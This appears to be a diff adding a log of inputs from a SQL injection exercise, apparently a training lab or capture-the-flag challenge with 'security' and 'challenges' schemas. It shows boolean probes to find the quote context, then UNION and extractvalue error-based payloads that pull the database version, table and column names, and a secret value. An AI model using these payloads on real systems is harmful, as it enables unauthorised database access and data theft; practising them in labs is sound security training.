@@ -1,0 +1,26 @@
+ID:1
+ID:10
+ID:-1' union select 1,2,3 -- 
+ID:1'
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1' and 1=1 #
+ID:1' and 1=2 #
+ID:1" and 1=2 #
+ID:1') and 1=2 #
+ID:1") and 1=2 #
+ID:1") and 1=2 #
+ID:1") and 1=1 #
+ID:-1") union select 1,2,extractvalue(1,concat(0x7e, (select version() ) ,0x7e)) #
+ID:-1") union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'security'  ) ,0x7e)) #
+ID:-1") union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges'  ) ,0x7e)) #
+ID:-1") union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name = '085KOCKZF6'  ) ,0x7e)) #
+ID:-1") union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(secret_H2EF) from 085KOCKZF6  ) ,0x7e)) #
